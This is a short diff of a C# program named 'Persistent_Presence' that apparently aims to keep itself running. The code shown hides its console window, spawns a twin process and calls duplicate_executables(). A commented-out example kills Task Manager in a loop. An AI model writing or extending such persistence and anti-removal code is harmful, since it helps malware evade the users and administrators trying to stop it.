@@ -1,7 +1,4 @@
 using System;
-using System.Collections.Generic;
-using Persistent_Presence;
-using Background_Process_Twins;
 using System.Runtime.InteropServices;
 using System.Threading;
 using System.Diagnostics;
@@ -23,6 +20,9 @@ namespace Persistent_Presence
 
         static void Main(string[] args)
         {
+            Persistent_Presence main_program = new Persistent_Presence();
+            main_program.duplicate_executables();
+            /*
             var handle = GetConsoleWindow();
             ShowWindow(handle, SW_HIDE); // Hide
 
@@ -36,7 +36,6 @@ namespace Persistent_Presence
                     main_program.execute_twin_process();
                 }
                 #region Example of practical usage (Continuously closes task manager).
-                /*
                 try
                 {
                     Process[] proc = Process.GetProcessesByName("Taskmgr");
@@ -51,9 +50,9 @@ namespace Persistent_Presence
                 {
                     Debug.WriteLine(ex);
                 }
-                */
                 #endregion
             }
+        */
         }
     }
 }
